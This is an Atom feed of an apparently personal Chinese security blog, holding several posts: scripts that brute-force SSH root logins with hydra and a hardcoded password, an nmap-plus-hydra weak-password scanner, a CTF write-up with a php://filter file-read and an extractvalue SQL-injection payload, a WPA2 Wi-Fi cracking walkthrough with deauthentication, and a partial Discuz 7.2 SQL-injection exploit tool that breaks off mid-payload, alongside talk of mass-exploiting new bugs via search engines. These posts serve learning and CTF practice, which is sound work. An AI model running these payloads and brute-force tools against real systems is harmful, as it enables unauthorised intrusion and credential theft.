<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Lawliet Blog</title>
  
  <subtitle>原创文章，未经授权请勿转载</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2018-05-17T15:38:17.406Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>Lawliet</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>用shell实现对指定ip进行自动基线安全检查</title>
    <link href="http://yoursite.com/2018/05/17/autocheck/"/>
    <id>http://yoursite.com/2018/05/17/autocheck/</id>
    <published>2018-05-17T15:14:50.395Z</published>
    <updated>2018-05-17T15:38:17.406Z</updated>
    
    <content type="html"><![CDATA[<h1 id="用shell脚本实现对指定ip进行自动基线安全检查"><a href="#用shell脚本实现对指定ip进行自动基线安全检查" class="headerlink" title="用shell脚本实现对指定ip进行自动基线安全检查"></a>用shell脚本实现对指定ip进行自动基线安全检查</h1><p><strong>最近在学习shell脚本，一直再尝试用shell实现一些有意思的东西，该脚本实现了自动上传基线脚本到指定linux服务器上运行检查，并且将检查结果文件发送到我们的机器</strong></p><p><strong>scp.exp:发送基线脚本到指定ip的服务器</strong></p><pre><code>#!/usr/bin/expect -fset timeout 10set host [lindex $argv 0]set username [lindex $argv 1]set password [lindex $argv 2]set src_file [lindex $argv 3]set dest_file [lindex $argv 4]spawn scp -r $src_file $username@$host:/tmp/$dest_fileexpect {     &quot;(yes/no)?&quot; {             send &quot;yes\n&quot;             expect &quot;*assword:&quot; { send &quot;$password\n&quot; }     }     &quot;*assword:&quot; {             send &quot;$password\n&quot;     }}expect &quot;100%&quot;expect eof:</code></pre><p><strong>excute.exp：ssh登陆指定ip执行之前上传的基线脚本，并且将运行结果的文件发送回来</strong></p><pre><code>#!/usr/bin/expect -f set ip [lindex $argv 0 ]set password [lindex $argv 1 ]set timeout 10spawn ssh root@$ip expect { &quot;*yes/no&quot; { send &quot;yes\r&quot;; exp_continue}&quot;*password:&quot; { send &quot;$password\r&quot; }}expect {&quot;#*&quot;  { send &quot;pwd\r cd /tmp/\r ./66c221be-6ab2-ef53-1589-fe16877914f4.sh $ip\r&quot; }}spawn scp root@$ip:/tmp/192.168.3.3_66c221be-6ab2-ef53-1589-fe16877914f4_chk.xml /root/autocheck/report/192.168.3.3_66c221be-6ab2-ef53-1589-fe16877914f4_chk.xmlexpect {     &quot;(yes/no)?&quot; {             send &quot;yes\n&quot;             expect &quot;*assword:&quot; { send &quot;$password\n&quot; }     }     &quot;*assword:&quot; {             send &quot;$password\n&quot;     }} expect eofexit</code></pre><p><strong>ip.list：存放需要检查的ip列表</strong></p><p><strong>autocheck.sh：读取ip列表，检查存活的主机，过滤出开放22端口的主机ip，调用之前写的两个脚本去自动传送基线检查脚本执行并且将结果返回回来</strong></p><pre><code>#!/bin/bashfor ip in `cat ip.list`donewip=`nmap -Pn -sS -p 22 $ip|grep &quot;open&quot; -B4|awk &apos;/Nmap scan/{print $5}&apos;`hydra -l root -p 123456 $newip ssh|grep &quot;password:&quot;if [ $? == 0 ]then./scp.exp $newip &quot;root&quot; &quot;123456&quot; &quot;/root/autocheck/linux_check/66c221be-6ab2-ef53-1589-fe16877914f4.sh&quot; &quot;66c221be-6ab2-ef53-1589-fe16877914f4.sh&quot;./scp.exp $newip &quot;root&quot; &quot;123456&quot; &quot;/root/autocheck/linux_check/66c221be-6ab2-ef53-1589-fe16877914f4.pl&quot; &quot;66c221be-6ab2-ef53-1589-fe16877914f4.pl&quot;./excute.exp $newip &quot;123456&quot;elsecontinuefidone</code></pre><p><strong>执行./autocheck.sh后的结果</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180517/9DhgKGAfg5.png?imageslim" alt="mark"><br><strong>可以看到report目录下就是返回来的文件，里面存放着linux基线扫描的结果</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180517/HaAkCfiD57.png?imageslim" alt="mark"></p><p><strong>还可以改进的地方，这个脚本用户名密码写死了，可以再加一个用户名密码文件，读取用户名密码登录，然后检查，这样会更有实际意义，自己会不断完善功能，希望在以后的实习中可以直接用到。</strong></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;用shell脚本实现对指定ip进行自动基线安全检查&quot;&gt;&lt;a href=&quot;#用shell脚本实现对指定ip进行自动基线安全检查&quot; class=&quot;headerlink&quot; title=&quot;用shell脚本实现对指定ip进行自动基线安全检查&quot;&gt;&lt;/a&gt;用shell脚本实现对
      
    
    </summary>
    
      <category term="Linux Shell" scheme="http://yoursite.com/categories/Linux-Shell/"/>
    
    
      <category term="Linux Shell" scheme="http://yoursite.com/tags/Linux-Shell/"/>
    
  </entry>
  
  <entry>
    <title>用shell实现自动化扫描主机端口爆破服务弱口令</title>
    <link href="http://yoursite.com/2018/05/14/autobrute/"/>
    <id>http://yoursite.com/2018/05/14/autobrute/</id>
    <published>2018-05-14T08:36:34.456Z</published>
    <updated>2018-05-17T15:14:19.953Z</updated>
    
    <content type="html"><![CDATA[<h1 id="用shell实现自动化扫描主机端口爆破服务弱口令"><a href="#用shell实现自动化扫描主机端口爆破服务弱口令" class="headerlink" title="用shell实现自动化扫描主机端口爆破服务弱口令"></a>用shell实现自动化扫描主机端口爆破服务弱口令</h1><h3 id="序"><a href="#序" class="headerlink" title="序"></a>序</h3><p><strong>最近在学习linux shell脚本的编写，学会写shell的一个好处就是能够批量执行我们要执行的命令，实现自动化工作，可以在今后的工作中提升工作效率，节省时间</strong></p><h3 id="需求"><a href="#需求" class="headerlink" title="需求"></a>需求</h3><p><strong>假设现在有一个需求，公司分配给你了一个ip列表，要求你将其中存活的主机筛选出来，检查这些主机是否开启了常用的服务，以及是否存在弱口令</strong></p><p><strong>一般常用的做法就是先利用nmap扫描出存活主机，然后扫描这些主机开放的端口，用hydra对这些端口进行弱口令安全检查。如果将这些命令写在一个shell脚本中，以后再次做相同的工作时直接运行我们编写的.sh文件就可以了，这样的话就能大大提高我们的工作效率，避免重复机械的工作，大大提升效率</strong></p><h3 id="编写shell脚本"><a href="#编写shell脚本" class="headerlink" title="编写shell脚本"></a>编写shell脚本</h3><p><strong>我编写的shell脚本有以下几部分组成</strong></p><p><strong>ip.txt</strong></p><pre><code>ip列表，里面放着要扫描的ip</code></pre><p><strong>service.conf</strong></p><pre><code>配置文件，里面是我们要检查的服务和其对应的端口号，使用者可以在这里进行设置要检查的服务</code></pre><p><strong>比如要检查ssh与mysql服务的弱口令，里面这样写，配置文件格式：<code>端口：服务</code></strong></p><pre><code>22:ssh3306:mysql</code></pre><p><strong>这样便能灵活的对我们需要的服务进行弱口令检测</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180514/HKF6Jl6Jdl.png?imageslim" alt="mark"></p><p><strong>user.txt</strong></p><pre><code>存放着常见的用户名，用于hydra爆破</code></pre><p><strong>passwd.txt</strong></p><pre><code>存放着常见的弱口令，用于hydra爆破</code></pre><p><strong>brute.sh</strong></p><pre><code>下面的就是我编写的shell脚本，可以自动化的完成上述的一系列工作#!/bin/bashfilename=$1for port in `awk -F &apos;:&apos; &apos;{print $1}&apos; service.conf`doname=`awk -F &apos;:&apos; &apos;/&apos;$port&apos;/{print $2}&apos; service.conf`echo &quot;$name weak password result:&quot;nmap -sn -iL $filename|awk &apos;/Nmap scan/{print $5}&apos;&gt;liveip.txtnmap -Pn -sS -p $port -iL liveip.txt|grep &quot;open&quot; -B &quot;5&quot;|awk &apos;/Nmap scan/{print $5}&apos;&gt;tmpip.txtif [ ! -s tmpip.txt ]thenecho &quot;no ip open port $port&quot;elseresult=`hydra -L user.txt -P passwd.txt -M tmpip.txt $name -t 4|awk &apos;/password:/{print $0}&apos;`echo $resultfidone</code></pre><p><strong>首先接收命令行的第一个参数，也就是要进行检查的ip列表文件ip.txt，之后循环读取服务配置文件，使用awk工具筛选出要检查的端口号和其对应的服务并赋值给对应的变量，之后用nmap进行主机存活扫描，将存活主机使用awk匹配出来输出到一个文件中，使用nmap对这个文件里的这些存活ip进行端口扫描，利用awk将nmap扫描结果中开放端口的ip筛选出来输出到一个文件里，之后利用hydra对这些ip进行其端口对应服务的弱口令检查</strong></p><p><strong>脚本运行结果，以自己所在内网的ip作为测试，ip段<code>192.168.3.0/24</code>,可以看出针对ssh服务还是检查出很多弱口令的，mysql服务大多数都禁止了远程连接，所以没有扫出弱口令</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180514/Ca7L5i0dGI.png?imageslim" alt="mark"></p><p><strong>这是初步编写的成果，只是与文件进行交互，而且有着很多的不足，之后随着学习的深入，相信会写出比这个更棒更完善的脚本</strong></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;用shell实现自动化扫描主机端口爆破服务弱口令&quot;&gt;&lt;a href=&quot;#用shell实现自动化扫描主机端口爆破服务弱口令&quot; class=&quot;headerlink&quot; title=&quot;用shell实现自动化扫描主机端口爆破服务弱口令&quot;&gt;&lt;/a&gt;用shell实现自动化扫描主
      
    
    </summary>
    
      <category term="Linux Shell" scheme="http://yoursite.com/categories/Linux-Shell/"/>
    
    
      <category term="Linux Shell" scheme="http://yoursite.com/tags/Linux-Shell/"/>
    
  </entry>
  
  <entry>
    <title>php parse_url()函数的漏洞</title>
    <link href="http://yoursite.com/2018/05/13/parse_url/"/>
    <id>http://yoursite.com/2018/05/13/parse_url/</id>
    <published>2018-05-13T10:11:57.382Z</published>
    <updated>2018-05-13T15:54:11.077Z</updated>
    
    <content type="html"><![CDATA[<h1 id="php-parse-url-函数的漏洞"><a href="#php-parse-url-函数的漏洞" class="headerlink" title="php parse_url()函数的漏洞"></a>php parse_url()函数的漏洞</h1><p><strong>在ctf比赛中经常遇到的一个知识点，记录一下，由于parse_url函数在解析url时存在的bug导致在某些情况下可以绕过正则的过滤</strong></p><p><strong>来看代码</strong></p><pre><code>&lt;?php$url=parse_url($_SERVER[&apos;REQUEST_URI&apos;]);parse_str($url[&apos;query&apos;],$query);var_dump($query); ?&gt;</code></pre><p><strong>访问url：<a href="http://127.0.0.1/info/parseurl.php?sql=select" target="_blank" rel="external">http://127.0.0.1/info/parseurl.php?sql=select</a></strong></p><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180513/acDbC5lEe8.png?imageslim" alt="mark"><br><strong>这里会是url中正常的参数值</strong></p><p><strong>如果访问url:<a href="http://127.0.0.1///info/parseurl.php?sql=select" target="_blank" rel="external">http://127.0.0.1///info/parseurl.php?sql=select</a></strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180513/EbCH4hKH9b.png?imageslim" alt="mark"><br><strong>这时将不能正常返回url中的参数值，遇到这样格式的连接，parse_url函数将会返回False，这种情况下可能会绕过某些waf的过滤</strong></p><p><strong>来看一道ctf题</strong></p><pre><code>http://118.126.113.78/web1/?id=1</code></pre><p><strong>已经确定id参数存在过滤，fuzz了一下，大概过滤了and,select,union,from等sql关键字，导致union注入和报错注入都失败，根据页面源代码的提示我们可以利用php伪协议读取出页面源代码看看它究竟是怎么样过滤的</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180513/0I4Bkl3ibm.png?imageslim" alt="mark"><br><strong>利用php伪协议文件包含读取waf.php的源代码</strong>    </p><pre><code>http://118.126.113.78/web1/?file=php://filter/convert.base64-encode/resource=waf.php</code></pre><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180513/fgjlla414b.png?imageslim" alt="mark"></p><pre><code>PD9waHANCmVycm9yX3JlcG9ydGluZygwKTsNCiRfR0VUPUFkZF9TKCRfR0VUKTsNCiRfUE9TVD1BZGRfUygkX1BPU1QpOw0KJF9DT09LSUU9QWRkX1MoJF9DT09LSUUpOw0KJF9SRVFVRVNUPUFkZF9TKCRfUkVRVUVTVCk7DQpmdW5jdGlvbiBBZGRfUygkYXJyYXkpDQp7DQpmb3JlYWNoKCRhcnJheSBhcyAka2V5PT4kdmFsdWUpew0KICAgICAgICAgICAgICAgIGlmKCFpc19hcnJheSgkdmFsdWUpKXsNCiAgICAgICAgICAgICAgICAgICAgICAgICRjaGVjaz0gcHJlZ19tYXRjaCgnL3JlZ2V4cHxhbmR8bGlrZXxcInwlfGluc2VydHx1cGRhdGV8ZGVsZXRlfHVuaW9ufGludG98bG9hZF9maWxlfG91dGZpbGV8XC9cKi9pJywgJHZhbHVlKTsNCiAgICAgICAgICAgICAgICAgICAgICAgIGlmKCRjaGVjaykNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBleGl0KCJIYWNrZXIhIik7DQogICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgfWVsc2V7DQogICAgICAgICAgICAgICAgICAgICAgICAkYXJyYXlbJGtleV09QWRkX1MoJGFycmF5WyRrZXldKTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgIH0NCnJldHVybiAkYXJyYXk7DQp9DQoNCmZ1bmN0aW9uIE1lYXN1cmVtZW50X3VybCgpDQp7DQogICAgJHVybD1wYXJzZV91cmwoJF9TRVJWRVJbJ1JFUVVFU1RfVVJJJ10pOw0KICAgIHBhcnNlX3N0cigkdXJsWydxdWVyeSddLCRxdWVyeSk7DQogICAgJEtleXdvcmQ9YXJyYXkoImZyb20iLCJzZWxlY3QiLCJsaWtlIiwib3IiKTsNCiAgICBmb3JlYWNoKCRxdWVyeSBhcyAka2V5KQ0KICB7DQogICAgICAgIGZvcmVhY2goJEtleXdvcmQgYXMgJHZhbHVlKQ0KICAgICAgICB7DQogICAgICAgICAgICBpZihwcmVnX21hdGNoKCIvIi4kdmFsdWUuIi8iLHN0cnRvbG93ZXIoJGtleSkpKQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIGRpZSgiZnVjayB1ISIpOw0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAgfQ0KfQ0KPz4NCg==</code></pre><p><strong>base64解码后</strong></p><pre><code>&lt;?phperror_reporting(0);$_GET=Add_S($_GET);$_POST=Add_S($_POST);$_COOKIE=Add_S($_COOKIE);$_REQUEST=Add_S($_REQUEST);function Add_S($array){foreach($array as $key=&gt;$value){            if(!is_array($value)){                    $check= preg_match(&apos;/regexp|and|like|\&quot;|%|insert|update|delete|union|into|load_file|outfile|\/\*/i&apos;, $value);                    if($check)                            {                            exit(&quot;Hacker!&quot;);                    }            }else{                    $array[$key]=Add_S($array[$key]);            }    }return $array;}function Measurement_url(){    $url=parse_url($_SERVER[&apos;REQUEST_URI&apos;]);    parse_str($url[&apos;query&apos;],$query);    $Keyword=array(&quot;from&quot;,&quot;select&quot;,&quot;like&quot;,&quot;or&quot;);    foreach($query as $key)    {    foreach($Keyword as $value)    {        if(preg_match(&quot;/&quot;.$value.&quot;/&quot;,strtolower($key)))        {            die(&quot;fuck u!&quot;);        }    }}}?&gt;</code></pre><p><strong>可以看到其实是写了两个函数分别过滤的，其中<code>ADD_S</code>函数确实是将其里面定义的黑名单sql关键字过滤死了，但是<code>Measurement_url</code>函数中接收url参数值确是通过的<code>parse_url</code>这个函数，之前文章开头也讲到了，使用这个函数取url参数时，会因为url的格式出现一些问题导致该函数返回Flase而绕过过滤，所以我们确定了真正被过滤的关键字只有<code>ADD_S</code>中的那些关键字，而单单过滤这些关键字是不够的，这样我们便通过<code>parse_url</code>函数的漏洞去绕过黑名单的检查，最终读取flag的payload</strong></p><pre><code>http://118.126.113.78///web1/?id=1&apos; ^ 1=extractvalue(1,concat(0x3a,(select password from sql_inject1 limit 3,1),0x3a))--+</code></pre><p><strong>（对select，from的过滤就可以通过parse_url这个函数的漏洞绕过）</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180513/3Lh2A7BimG.png?imageslim" alt="mark"></p><pre><code>XPATH syntax error: &apos;:flag{WE_ARe_FaMiLy!1234567}:&apos;</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;php-parse-url-函数的漏洞&quot;&gt;&lt;a href=&quot;#php-parse-url-函数的漏洞&quot; class=&quot;headerlink&quot; title=&quot;php parse_url()函数的漏洞&quot;&gt;&lt;/a&gt;php parse_url()函数的漏洞&lt;/h1&gt;&lt;p&gt;
      
    
    </summary>
    
      <category term="ctf" scheme="http://yoursite.com/categories/ctf/"/>
    
    
      <category term="ctf" scheme="http://yoursite.com/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>kali无线网卡wifi破解</title>
    <link href="http://yoursite.com/2018/04/19/wificrack/"/>
    <id>http://yoursite.com/2018/04/19/wificrack/</id>
    <published>2018-04-19T10:47:50.538Z</published>
    <updated>2018-04-20T11:18:47.117Z</updated>
    
    <content type="html"><![CDATA[<h1 id="kali无线网卡wifi破解"><a href="#kali无线网卡wifi破解" class="headerlink" title="kali无线网卡wifi破解"></a>kali无线网卡wifi破解</h1><h3 id="准备环境"><a href="#准备环境" class="headerlink" title="准备环境"></a>准备环境</h3><p><strong>1.kali2.0操作系统，本人用的32位的，装在vm12虚拟机中</strong></p><p><strong>2.kali所支持的无线网卡，型号为RT3070，淘宝淘来的</strong></p><h3 id="攻击步骤"><a href="#攻击步骤" class="headerlink" title="攻击步骤"></a>攻击步骤</h3><p><strong>1.将usb无线网卡连入虚拟机</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180419/Dmj4eH7lf8.png?imageslim" alt="mark"><br><strong>2.查看无线网卡wlan0是否存在</strong></p><pre><code>iwconfig</code></pre><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180419/HEKkcL16ae.png?imageslim" alt="mark"><br><strong>3.开启无线网卡的侦听功能</strong></p><pre><code>airmon-ng start wlan0</code></pre><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180419/cBd1C0Fmi2.png?imageslim" alt="mark"><br><strong>如果出现无法侦听数据，先kill一下进程再重新启动一下无线网卡</strong></p><pre><code>airmon-ng check killairmon-ng start wlan0</code></pre><p><strong>4.iwconfig再次查看网卡，看到无线网卡已经变为了wlan0mon，说明无线网卡开启了监听功能</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180419/LF9m1D86jA.png?imageslim" alt="mark"><br><strong>5.使用无线网卡侦听附近的wifi信号</strong></p><pre><code>airodump-ng wlan0mon</code></pre><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180419/j9JD8Ahaj1.png?imageslim" alt="mark"><br><strong>比较重要的几个值，BSSID代表无线网络的唯一标识，也就是路由的MAC地址，CH代表wifi信道，我们攻击的wifi选择了我们实验室的wifi:<code>secevery</code>，可以看到信号还是不错的</strong><br><strong>6.选择要破解的wifi并且抓取握手包</strong></p><pre><code>airodump-ng -c 信道 --bssid BSSID -w 保存文件 wlan0mon</code></pre><p><strong>在这里我们要攻击的BSSID为B0:E1:7E:7D:EA:CC，信道为1</strong></p><pre><code>airodump-ng -c 1 --bssid B0:E1:7E:7D:EA:CC -w secevery wlan0mon</code></pre><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180419/88FcA7C3Il.png?imageslim" alt="mark"><br><strong>STATION为wifi下所有设备的MAC地址</strong><br><strong>7.如果抓不到握手包，就要模拟station，模拟其断开，就是踢掉相应的设备，使其重连再抓握手包，10表示发送10个包</strong><br>    airepaly-ng -0 10 -a BSSID -c 你要踢掉的设备的MAC地址 wlan0mon<br><img src="http://p008biu9n.bkt.clouddn.com/blog/180419/8Jj860fILB.png?imageslim" alt="mark"><br><strong>如果出现红框里的内容，说明抓到握手包</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180419/Ig4ah756CG.png?imageslim" alt="mark"><br><strong>ls查看可以看到已经抓到握手包</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180419/9m6JIILFFF.png?imageslim" alt="mark"></p><p><strong>8.进行wifi破解，破解成功</strong></p><pre><code>aircrack-ng -a2 -b B0:E1:7E:7D:EA:CC -w passwd.txt secevery-01.cap</code></pre><p><strong>其中a2代表wifi的加密协议为WPA2</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180419/fIiLEhjmD8.png?imageslim" alt="mark"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;kali无线网卡wifi破解&quot;&gt;&lt;a href=&quot;#kali无线网卡wifi破解&quot; class=&quot;headerlink&quot; title=&quot;kali无线网卡wifi破解&quot;&gt;&lt;/a&gt;kali无线网卡wifi破解&lt;/h1&gt;&lt;h3 id=&quot;准备环境&quot;&gt;&lt;a href=&quot;#准
      
    
    </summary>
    
      <category term="无线安全" scheme="http://yoursite.com/categories/%E6%97%A0%E7%BA%BF%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="wifi破解" scheme="http://yoursite.com/tags/wifi%E7%A0%B4%E8%A7%A3/"/>
    
  </entry>
  
  <entry>
    <title>python爬取补天src列表</title>
    <link href="http://yoursite.com/2018/04/17/butianspider/"/>
    <id>http://yoursite.com/2018/04/17/butianspider/</id>
    <published>2018-04-17T09:28:12.804Z</published>
    <updated>2018-04-17T09:53:51.525Z</updated>
    
    <content type="html"><![CDATA[<h1 id="用python爬取补天src列表"><a href="#用python爬取补天src列表" class="headerlink" title="用python爬取补天src列表"></a>用python爬取补天src列表</h1><p><strong>分享一个我写的代码，用python爬取补天src列表，同时可以爬取网站域名和漏洞的提交数和处理数，以公益src为例，贴出我写的代码</strong></p><pre><code># -*- coding: utf-8 -*-import requestsfrom bs4 import BeautifulSoupurl=&quot;http://loudong.360.cn/Reward/pub&quot;for pnum in range(1,160):    r=requests.post(url=url,data={&apos;s&apos;:1,&apos;p&apos;:pnum}).json()    for info in r[&quot;data&quot;][&quot;list&quot;]:        company_name=info[&quot;company_name&quot;]        company_url=&quot;http://loudong.360.cn/Company/&quot;+info[&quot;company_id&quot;]        html=requests.get(url=company_url).content        soup=BeautifulSoup(html,&quot;lxml&quot;)        num=soup.find_all(class_=&quot;spp&quot;)        print &quot;漏洞数:&quot;,num[0].string,&quot;已处理:&quot;,num[1].string        surl=&quot;http://loudong.360.cn/Loo/submit?cid=&quot;+info[&quot;company_id&quot;]        headers={&quot;Cookie&quot;:&quot;你登陆后的cookie&quot;}        html=requests.get(url=surl,headers=headers).content        soup=BeautifulSoup(html,&quot;lxml&quot;)        site=soup.find(&quot;input&quot;,attrs={&quot;placeholder&quot;:&quot;请输入厂商域名&quot;})[&quot;value&quot;]        print company_name        print site        print u&quot;漏洞数:&quot;, num[0].string, u&quot;已处理:&quot;, num[1].string        print &quot;-------------------------------------------------------------------------------------------------&quot;</code></pre><p><strong>爬取时需要用到的库</strong></p><pre><code>requests库和bs4库</code></pre><p><strong>补天还是十分好爬的，只要分析好每次请求和响应，爬下关键请求的页面，用bs4的BeautifulSoup解析提取数据即可</strong></p><p><strong>关于BeautifulSoup，自己写代码很喜欢用，提取数据很方便，<a href="https://www.crummy.com/software/BeautifulSoup/bs4/doc.zh/" title="官方文档" target="_blank" rel="external">官方文档</a>写的非常详细</strong></p><p><strong>运行结果</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180417/94aIlf0B6K.png?imageslim" alt="mark"></p><h3 id="分享我写爬虫的一些经验"><a href="#分享我写爬虫的一些经验" class="headerlink" title="分享我写爬虫的一些经验"></a>分享我写爬虫的一些经验</h3><p><strong>最后总结一下我多次写爬虫所总结的经验和方法，爬取网页数据通用的一些方法</strong></p><p><strong>request库常用总结</strong></p><pre><code>html=requests.get(url=url,params={params},headers={headers},cookies={cookies},proxies={proxies}).content用于http GET方法请求的页面，需要提交参数时可以直接在url的?后加参数，也可以将GET请求参数以字典的数据类型赋值给request库get方法中params参数进行提交参数作用:params:字典数据类型，存放http请求的GET参数headers：字典数据类型，里面内容为http的一些请求头，比如Host，User-Agent，主要用来突破一些网站的防爬机制，cookie值也能放到这个里面cookies:字典数据类型,用来存放cookie值proxies：字典数据类型,爬取页面所需要设置的代理，比如爬取谷歌和一些国外网站，因为国内被墙了，搭了ss才能访问，但是直接用python请求页面还是不行，这时候就需要在这里进行设置了，我一般是这样设置的,因为我ss客户端设在了本地1088端口:proxies={&quot;http&quot;:&quot;http://127.0.0.1:1088&quot;,&quot;https&quot;:&quot;https://127.0.0.1:1088&quot;}html=requests.post(url=url,data={data},headers={headers},cookies={cookies},proxies={proxies}).content用于http POST方法请求的页面data:字典数据类型，POST提交的参数headers，cookie，proxies:均和上述的作用一致</code></pre><p><strong>re库常用总结</strong></p><pre><code>p=re.compile(r&quot;编写的正则表达式&quot;)用来编译正则表达式对象并且返回一个正则表达式对象list=p.findall(页面)匹配页面中和正则表达式匹配的数据并且将所有结果以列表的形式返回关于正则表达式，需要多加练习，每个人都有不一样的编写正则方法，只要能将需要的数据精确完整匹配出来的方法都是好方法，特别需要注意贪婪匹配和非贪婪匹配的区别和用法(.*?|.*+)</code></pre><p><strong>bs4库的BeautifulSoup常用总结</strong></p><pre><code>使用BeautifulSoup提取数据，首先要了解html DOM格式:简单来说就是，&lt;标签 属性=&quot;属性值&quot;&gt;文本&lt;/标签&gt;from bs4 import BeautifulSoupsoup=BeautifulSoup(html,&quot;lxml&quot;)返回一个BeautifulSoup对象，我一般比较喜欢用lxml格式解析页面，用多了自然就成习惯了list=soup.find_all(html标签属性=属性值)寻找html所有匹配&quot;html标签属性=属性值&quot;的html标签并以列表的形式返回，列表中每个值的类型均为BeautifulSoup对象for i in list:    i[&quot;属性&quot;]用来提取某一属性下的属性值    i.string用来提取html标签中的文本</code></pre><p><strong>urllib库常用总结</strong></p><pre><code>urllib.urlretrieve(url,filename)urllib库的urlretrieve方法主要用来下载文件，通常将页面爬下来后，用正则表达式或者BeautifulSoup将jpg，png一些图片，xls，doc一些文档，或者mp4等视频连接爬下来后，一般都需要用这个库下载url:资源的链接filename：文件存放的位置，我一般这样写，filename=yourfilepath+url.split(&apos;/&apos;)[-1],比较方便</code></pre><h3 id="我对写爬虫的看法"><a href="#我对写爬虫的看法" class="headerlink" title="我对写爬虫的看法"></a>我对写爬虫的看法</h3><p><strong>以上总结了我写代码的一些方法经验，我对编程的看法是：其实每个人写代码的方式都不太一样，代码写的多了就会有自己的风格。代码主要还是为了解决需求，节省人力，能够将代码用到自己的生活或者工作中，是件很有意思的事情，我觉得写python代码的要点有几个:要多动手写，看官方文档的效率比看书高，编程书是用来查的，百度谷歌很强大</strong></p><h3 id="python爬虫能力对安全人员的作用"><a href="#python爬虫能力对安全人员的作用" class="headerlink" title="python爬虫能力对安全人员的作用"></a>python爬虫能力对安全人员的作用</h3><p><strong>开发简单的漏扫工具，需要爬虫的基础</strong></p><p><strong>根据漏洞编写exp，新爆出的漏洞，exp早写出来可以多刷些漏洞</strong></p><p><strong>利用搜素引擎批量刷漏洞，对于新爆出的漏洞，编写exp后结合搜索引擎的语法寻找网络空间中的漏洞相关组件去测试，整个过程都可以用python爬虫技术自动化完成</strong></p><p><strong>贴出我很久之前学习python时利用python编写的一个自动化利用漏洞的工具代码，选择的漏洞为<a href="https://www.seebug.org/vuldb/ssvid-87114" title="discuz7.2 fap.php注入" target="_blank" rel="external">discuz7.2 faq.php注入</a>漏洞，实现了类似sqlmap的命令行操作</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180417/ifHaEfc52a.png?imageslim" alt="mark"></p><pre><code>#coding=utf-8import requestsimport reimport sysfrom optparse import OptionParserfrom threading import Threaddef main():    parser=OptionParser()    parser.add_option(&quot;-u&quot;,type=&quot;string&quot;,dest=&quot;url&quot;,help=&quot;&quot;)    parser.add_option(&quot;-r&quot;,type=&quot;string&quot;,dest=&quot;filename&quot;,help=&quot;&quot;)    parser.add_option(&quot;-C&quot;,type=&quot;string&quot;,dest=&quot;column&quot;,help=&quot;&quot;)    parser.add_option(&quot;-T&quot;,type=&quot;string&quot;,dest=&quot;table&quot;,help=&quot;&quot;)    parser.add_option(&quot;-D&quot;,type=&quot;string&quot;,dest=&quot;db&quot;,help=&quot;&quot;)    parser.add_option(&quot;--dbs&quot;,action=&quot;store_true&quot;,dest=&quot;dbs&quot;,help=&quot;&quot;)    parser.add_option(&quot;--dump&quot;,action=&quot;store_true&quot;,dest=&quot;dump&quot;,help=&quot;&quot;)    parser.add_option(&quot;--tables&quot;,action=&quot;store_true&quot;,dest=&quot;tables&quot;,help=&quot;&quot;)    parser.add_option(&quot;--columns&quot;,action=&quot;store_true&quot;,dest=&quot;columns&quot;,help=&quot;&quot;)    (options,args)=parser.parse_args()    if options.url and len(sys.argv)==3:        url=options.url        result=testurl(url)        if result:            getinfo(url)        else:            pass    elif options.url and options.dbs:#--dbs        url=options.url        getdbs(url)    elif options.url and options.tables and options.db:#-u url --tables -D database        url=options.url        db=options.db        gettables(url,db)    elif options.url and options.columns and options.table and options.db:#-u url --columns -T table -D database        url=options.url        table=options.table        db=options.db        getcolumns(url,table,db)    elif options.url and options.dump and options.column and options.table and options.db:#-u url --dump  -C column -T table -D database        url=options.url        column=options.column        table=options.table        db=options.db        dumpdata(url,column,table,db)    elif options.filename:        filename=options.filename        testurllist(filename)def testurl(url):    payload={&apos;action&apos;:&apos;grouppermission&apos;,&apos;gids[99]&apos;:&quot;&apos;&quot;}    content=requests.get(url=url,params=payload)    str=content.text    p=re.compile(r&quot;You have an error in your SQL syntax&quot;)    if re.findall(p,str):        print &quot;this url injectable!&quot;        return True    else:        print &quot;this url not injectable&quot;        return Falsedef testurllist(filename):    try:        file=open(filename,&quot;r&quot;)        urllist=[url.strip() for url in file.readlines()]        for url in urllist:            print &quot;test url..............%s&quot;%(url)            testurl(url)    except IOError,e:        print &quot;file open error&quot;,edef getinfo(url):    payload={&apos;action&apos;:&apos;grouppermission&apos;,&apos;gids[99]&apos;:&quot;&apos;&quot;,&apos;gids[100][0]&apos;:&apos;) and (select 1 from (select 